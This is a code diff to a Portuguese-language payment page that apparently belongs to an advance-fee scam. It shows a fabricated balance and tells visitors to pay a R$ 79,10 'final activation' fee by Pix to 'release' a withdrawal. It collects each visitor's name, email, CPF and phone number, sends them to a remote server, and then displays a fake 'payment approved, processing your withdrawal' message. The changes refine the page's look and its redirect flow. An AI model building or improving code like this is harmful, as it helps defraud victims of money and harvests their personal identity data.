@@ -161,6 +161,7 @@ input:focus{
     display: block;
     border: 1px solid #eee;
     padding: 5px;
+    border-radius: 8px;
 }
 
 .pix-input {
@@ -172,6 +173,7 @@ input:focus{
     text-align: center;
     margin-bottom: 10px;
     border-radius: 5px;
+    outline: none;
 }
 
 </style>
@@ -214,7 +216,7 @@ input:focus{
         <div class="resumo">
             <div class="linha"><span>Valor Inicial</span> <span>R$ 1.342,03</span></div>
             <div class="linha"><span>Taxas Acumuladas</span> <span>+ R$ 66,80</span></div>
-            <div class="linha"><span>Ativação Final</span> <span>+ R$ 79,10</span></div>
+            <div class="linha"><span>Ativação Final</span> <span style="color: #28a745;">+ R$ 79,10</span></div>
             <div class="linha total"><span>VALOR TOTAL</span> <span>R$ 1.487,93</span></div>
         </div>
 
@@ -222,35 +224,41 @@ input:focus{
     </div>
 
     <div id="pix_area">
-        <h3 style="color: #1f9c6b; font-size: 16px;">✅ PIX GERADO COM SUCESSO</h3>
-        <p style="font-size: 12px; color: #666;">Pague a taxa de <b>R$ 79,10</b> para liberar seu saldo.</p>
+        <h3 id="titulo_pix" style="color: #1f9c6b; font-size: 16px;">✅ PIX GERADO COM SUCESSO</h3>
+        <p id="subtitulo_pix" style="font-size: 13px; color: #666; margin-top: 5px;">Pague a taxa de <b>R$ 79,10</b> para liberar seu saldo.</p>
         
-        <img id="qr_img" src="">
+        <img id="qr_img" src="" alt="QR Code Pix">
         
         <input type="text" id="pix_code" class="pix-input" readonly>
         
-        <button class="btn" style="background: #28a745;" onclick="copiarPix()">COPIAR CÓDIGO PIX</button>
+        <button class="btn" id="btn_copy" style="background: #28a745; margin-top: 0;" onclick="copiarPix()">COPIAR CÓDIGO PIX</button>
     </div>
 
 </div>
 
 <script>
-// CONFIGURAÇÃO DO SEU SERVIDOR
+// ==========================================================
+// CONFIGURAÇÕES 
+// ==========================================================
 const URL_SERVIDOR = "https://checkoutfinal.onrender.com"; 
 
-// 1. CARREGAR DADOS AUTOMÁTICOS
+// 🔴 1. COLOQUE AQUI A PÁGINA FINAL DE "SAQUE REALIZADO COM SUCESSO"
+const URL_SUCESSO_FINAL = "https://SEU_SITE.com/pagina-sucesso-final"; 
+
+// ==========================================================
+
+// 2. CARREGAR DADOS AUTOMÁTICOS
 window.onload = function() {
     const local = JSON.parse(localStorage.getItem('dadosUsuario') || '{}');
     const params = new URLSearchParams(window.location.search);
 
-    // Tenta pegar da URL ou do LocalStorage
     document.getElementById('nome').value = params.get('nome') || local.nome || "";
     document.getElementById('email').value = params.get('email') || local.email || "";
     document.getElementById('cpf').value = params.get('cpf') || local.cpf || local.documento || "";
     document.getElementById('telefone').value = params.get('phone') || local.telefone || "";
 };
 
-// 2. MÁSCARAS
+// 3. MÁSCARAS
 document.getElementById('cpf').addEventListener('input', function(e){
     let v = e.target.value.replace(/\D/g,'');
     v = v.replace(/(\d{3})(\d)/,'$1.$2');
@@ -266,17 +274,16 @@ document.getElementById('telefone').addEventListener('input', function(e){
     e.target.value = v;
 });
 
-// 3. FUNÇÃO PARA GERAR O PIX
+// 4. FUNÇÃO PARA GERAR O PIX
 function gerarPix() {
     const btn = document.getElementById('btn_gerar');
     
-    // Captura os dados dos campos (editados ou não)
     const dados = {
         name: document.getElementById('nome').value,
         email: document.getElementById('email').value,
         cpf: document.getElementById('cpf').value.replace(/\D/g, ''),
         phone: document.getElementById('telefone').value.replace(/\D/g, ''),
-        valor: "79.10"
+        valor: "79.10" // Valor da última taxa
     };
 
     if (dados.cpf.length < 11 || !dados.name) {
@@ -295,48 +302,68 @@ function gerarPix() {
     .then(res => res.json())
     .then(data => {
         if(data.success) {
-            // Esconde resumo e botão antigo
+            // Esconde resumo e mostra a área do Pix
             document.getElementById('resumo_container').style.display = 'none';
-            
-            // Mostra o QR Code
             document.getElementById('pix_area').style.display = 'block';
             
-            // Trata a imagem do QR Code
-            const imgSource = data.encodedImage.startsWith('http') ? data.encodedImage : `data:image/png;base64,${data.encodedImage}`;
-            document.getElementById('qr_img').src = imgSource;
+            // 👇 SOLUÇÃO À PROVA DE FALHAS PARA A IMAGEM 👇
             document.getElementById('pix_code').value = data.payload;
+            document.getElementById('qr_img').src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(data.payload)}`;
 
-            // Monitorar Pagamento
+            // Inicia o monitoramento
             if(data.transactionId) monitorar(data.transactionId);
+
         } else {
-            alert("Erro: " + data.message);
-            btn.innerText = "TENTAR NOVAMENTE";
+            alert("Erro: Não foi possível conectar ao banco. Tente novamente.");
+            btn.innerText = "PROSSEGUIR PARA PAGAMENTO";
             btn.disabled = false;
         }
     })
     .catch(err => {
-        alert("Erro ao conectar com o servidor.");
-        btn.innerText = "TENTAR NOVAMENTE";
+        alert("Erro de conexão com a internet.");
+        btn.innerText = "PROSSEGUIR PARA PAGAMENTO";
         btn.disabled = false;
     });
 }
 
+// 5. MONITORAMENTO (PULA DE PÁGINA SOZINHO)
 function monitorar(id) {
-    setInterval(() => {
+    const intervalo = setInterval(() => {
         fetch(`${URL_SERVIDOR}/check-status/${id}`)
         .then(r => r.json())
         .then(res => {
-            if(res.paid) window.location.href = "PAGINA_DE_SUCESSO.html";
-        });
+            if(res.paid) {
+                clearInterval(intervalo);
+                
+                // UX: Avisa o cliente que deu certo antes de pular a página
+                document.getElementById('titulo_pix').innerText = "🚀 PAGAMENTO APROVADO!";
+                document.getElementById('titulo_pix').style.color = "#18a558";
+                document.getElementById('subtitulo_pix').innerText = "Processando seu saque, aguarde...";
+                
+                setTimeout(() => {
+                    window.location.href = URL_SUCESSO_FINAL;
+                }, 1500);
+            }
+        })
+        .catch(e => console.log("Aguardando confirmação..."));
     }, 3000);
 }
 
+// 6. COPIAR CÓDIGO MELHORADO
 function copiarPix() {
     const copyText = document.getElementById("pix_code");
     copyText.select();
     copyText.setSelectionRange(0, 99999);
     navigator.clipboard.writeText(copyText.value);
-    alert("Código Pix copiado!");
+    
+    const btnCopy = document.getElementById('btn_copy');
+    btnCopy.innerText = "✅ CÓDIGO COPIADO!";
+    btnCopy.style.background = "#148647"; 
+    
+    setTimeout(() => {
+        btnCopy.innerText = "COPIAR CÓDIGO PIX";
+        btnCopy.style.background = "#28a745";
+    }, 3000);
 }
 </script>
 
